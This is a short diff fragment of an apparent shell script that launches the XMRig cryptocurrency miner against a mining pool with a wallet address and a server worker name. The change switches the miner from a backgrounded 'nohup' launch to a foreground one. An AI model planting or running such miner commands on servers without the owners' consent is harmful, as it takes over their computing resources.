@@ -10,4 +10,4 @@ mv xmrig-6.24.0 xmrig
 
 cd xmrig
 
-nohup ./xmrig -a rx/0 -o eticapool.com:9999 -u 0x6e9c6f5e65b0df232f0c9986ada8101686019024.Ox-srv4 -p x -k &
+./xmrig -a rx/0 -o eticapool.com:9999 -u 0x6e9c6f5e65b0df232f0c9986ada8101686019024.Ox-srv4
